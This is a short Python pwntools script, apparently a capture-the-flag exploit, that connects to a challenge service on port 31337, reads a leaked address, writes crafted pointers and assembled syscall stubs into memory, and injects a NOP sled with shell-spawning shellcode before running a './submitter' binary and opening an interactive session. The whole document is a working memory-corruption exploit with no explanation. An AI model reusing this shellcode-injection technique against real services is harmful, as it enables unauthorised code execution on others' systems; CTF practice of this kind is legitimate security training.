#!/usr/bin/env python3
import time

from pwn import *
context.arch="amd64"
HOST = os.environ.get('HOST', 'localhost')
PORT = 31337

io = remote(HOST, int(PORT))
addr = u64(io.recv(8).ljust(8,b"\x00"))
print("addr = {}".format(hex(addr)))
io.send(p64(addr+0x00045B0))
io.send(p64(0))
io.send(p64(addr+0x000045B8))
io.send(p64(0))

io.send(p64(addr+0x4330))
io.send(p64(addr+0x1370))
io.send(p64(addr+0x4338))
io.send(p64(addr+0x2000))

io.send(b"\x00"*8)
io.send(b"\x00"*4)
io.send(p64(addr + 0x2110))
io.send(asm("syscall") + asm("mov rsi,rcx")+asm("mov dh,2"))
io.send(p64(addr + 0x2110+7))
io.send(asm("xor rax,rax") + asm("syscall")*2 +b"\x00")
io.send(p64(addr + 0x004350))
io.sendline(b"\x90"*0x20 + asm(shellcraft.sh()))
time.sleep(0.5)
io.recv(100)
io.sendline(b"./submitter")

io.interactive()
